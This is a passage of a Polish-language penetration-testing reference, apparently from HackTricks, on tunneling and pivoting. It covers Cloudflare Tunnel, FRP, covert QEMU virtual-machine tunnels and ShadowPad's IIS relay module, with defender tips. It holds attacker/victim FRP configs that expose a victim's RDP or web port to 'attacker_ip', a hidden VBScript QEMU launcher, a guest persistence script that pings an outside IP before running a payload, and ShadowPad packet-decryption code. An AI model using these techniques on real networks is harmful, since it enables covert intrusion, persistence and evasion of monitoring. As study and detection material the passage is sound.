### Trwałe tunele z DNS

Lokalnie zarządzana konfiguracja tunelu używa kluczy `tunnel`, `credentials-file` i `url` zapisanych małymi literami, jak pokazano poniżej.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Uruchom connector:
```bash
cloudflared tunnel run mytunnel
```
Connector ustanawia połączenia wychodzące i domyślnie negocjuje QUIC z fallbackiem do HTTP/2; nie zakładaj, że każde wdrożenie korzysta z TCP/443. Uruchamiaj go wyłącznie z uprawnieniami wymaganymi przez dane wdrożenie.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) to reverse proxy napisany w Go, obsługujący **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX i XTCP**. XTCP korzysta z P2P hole punching, którego powodzenie zależy od NAT. Od wersji **v0.53.0** może działać jako **SSH Tunnel Gateway**, dzięki czemu host docelowy może korzystać ze standardowego klienta OpenSSH bez pliku binarnego `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Klasyczny reverse tunnel TCP
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Korzystanie z nowej bramy SSH (bez pliku binarnego frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Powyższe polecenie publikuje port ofiary **8080** jako **attacker_ip:9000** przy użyciu standardowego klienta OpenSSH, podczas gdy `frps` zapewnia gateway.<sup>[[50]](#references)</sup>

## Ukryte tunele oparte na VM z QEMU

Sieciowanie QEMU w trybie użytkownika nie wymaga uprawnień root ani administratora dla sieci wirtualnej, a `-netdev user,hostfwd=...` przekierowuje połączenia TCP, UDP lub UNIX z hosta do guest.<sup>[[51]](#references)</sup> TrustedSec opisał VM Tiny Core QEMU oraz próbę utworzenia reverse SSH tunnel w incydencie, w którym EDR skoncentrowany na hoście mógł nie wykryć aktywności wewnątrz guest.<sup>[[1]](#references)</sup>

### Szybki one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Powyższe polecenie uruchamia maszynę gościa **Tiny Core Linux** z 256 MiB pamięci gościa i obrazem dysku qcow2; obraz dysku nie jest dyskiem w pamięci RAM.
• Port **2222/tcp** na hoście Windows jest transparentnie przekierowywany do portu **22/tcp** wewnątrz maszyny gościa.
• Z punktu widzenia atakującego cel udostępnia po prostu port 2222; wszystkie docierające do niego pakiety są obsługiwane przez serwer SSH działający w maszynie wirtualnej.

### Stealthy uruchamianie przez VBScript

TrustedSec zaobserwował uruchamianie QEMU sterowane przez VBS oraz obrazy Tiny Core w incydencie wspomnianym powyżej.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Uruchomienie skryptu za pomocą `cscript.exe //B update.vbs` utrzymuje okno w ukryciu.<sup>[[1]](#references)</sup>

### Persistence w guest

Opisany incydent przedstawia persistence w bezstanowym guest Tiny Core za pośrednictwem `/opt/bootlocal.sh` i `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Zapisz payload w `/opt/123.out`
2. Dodaj do `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Dodaj `home/tc` i `opt` do `/opt/filetool.lst`, aby payload został spakowany do `mydata.tgz` podczas zamykania systemu.

### Kwestie telemetrii

• Host nadal ujawnia proces QEMU, obraz qcow2 oraz każdy listener przekierowany przez hosta.
• Skanowanie procesów ograniczone do hosta może nie obejmować procesów guest, ale wirtualizacja nie gwarantuje evasion; telemetria sieciowa, QEMU i obrazu nadal może go ujawnić.<sup>[[1]](#references)[[51]](#references)</sup>

### Wskazówki dla defenderów

• Generuj alerty dla **nieoczekiwanych binariów QEMU/VirtualBox/KVM** w ścieżkach zapisywalnych przez użytkownika.
• Blokuj połączenia wychodzące inicjowane przez `qemu-system*.exe`.
• Wyszukuj rzadko używane porty nasłuchujące (2222, 10022, …), które zaczynają nasłuchiwać natychmiast po uruchomieniu QEMU.

## Węzły relay IIS/HTTP.sys za pośrednictwem `HttpAddUrl` (ShadowPad)

Check Point opisuje moduł IIS ShadowPad jako przekształcający zaatakowane brzegowe serwery webowe w backdoor i węzły relay poprzez wiązanie prefiksów URL za pomocą `HttpAddUrl`.<sup>[[3]](#references)</sup>

Ten sam raport szczegółowo opisuje wartości domyślne, wildcard listenery, deszyfrowanie pakietów, kolejki relay oraz telemetrię debugowania podsumowane poniżej.<sup>[[3]](#references)</sup>

* **Wartości domyślne konfiguracji** – jeśli konfiguracja JSON modułu pomija wartości, moduł korzysta z wiarygodnych wartości domyślnych IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dzięki temu na prawidłowy ruch odpowiada IIS, używając właściwego brandingu.
* **Przechwytywanie wildcard** – operatorzy podają rozdzieloną średnikami listę prefiksów URL (wildcards w hoście i ścieżce). Moduł wywołuje `HttpAddUrl` dla każdego wpisu, dlatego HTTP.sys przekazuje pasujące żądania do malicious handler; żądania, które nie pasują, są obsługiwane przez standardowe działanie IIS.
* **Szyfrowany pierwszy pakiet** – pierwsze dwa bajty body żądania zawierają seed dla niestandardowego 32-bitowego PRNG. Każdy kolejny bajt jest poddawany operacji XOR z wygenerowanym keystreamem przed parsowaniem protokołu:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orkiestracja relay** – moduł utrzymuje dwie listy: „servers” (węzły upstream) i „clients” (implanty downstream). Wpisy są usuwane, jeśli heartbeat nie nadejdzie w ciągu około 30 sekund. Gdy obie listy nie są puste, moduł łączy pierwszego sprawnego servera z pierwszym sprawnym clientem i po prostu przekazuje bajty między ich socketami do momentu zamknięcia jednej ze stron.
* **Telemetria debugowania** – opcjonalne logowanie rejestruje źródłowy adres IP, docelowy adres IP oraz łączną liczbę przekazanych bajtów dla każdej pary. Śledczy wykorzystali te ślady do odtworzenia sieci ShadowPad obejmującej wiele ofiar.

---

## Inne narzędzia do sprawdzenia

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ukrywanie się w cieniu: Covert Tunnels za pośrednictwem wirtualizacji QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Przed ToolShell: analiza wcześniejszych operacji ransomware Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci relay i wewnętrznego działania skrytej operacji offensive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Przewodnik referencyjny Nmap: omijanie ograniczeń firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Podręcznik ssh OpenBSD](https://man.openbsd.org/ssh)
- [7] [Podręcznik sshd_config OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Informacje o wydaniu OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting w Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Dokumentacja modułu socks_proxy Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Dokumentacja modułu autoroute Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng: szybki start](https://docs.ligolo.ng/Quickstart/)
- [18] [Listenery Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost w Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Podręcznik socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Podręcznik PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opcje wiersza poleceń PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Polecenie Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Dokumentacja Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Reguły Proxification Rules w Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Podręcznik OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README iodine](https://code.kryo.se/iodine/README.html)
- [32] [README dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Nazwy domen - implementacja i specyfikacja](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI agenta ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interfejs inspekcji webowej ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Virtual hosts ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Konfiguracja agenta ngrok v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Przegląd Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parametry origin Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Konfiguracja Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Plik konfiguracyjny Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parametry uruchamiania Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Koncepcje frp](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Dokumentacja sieciowa QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
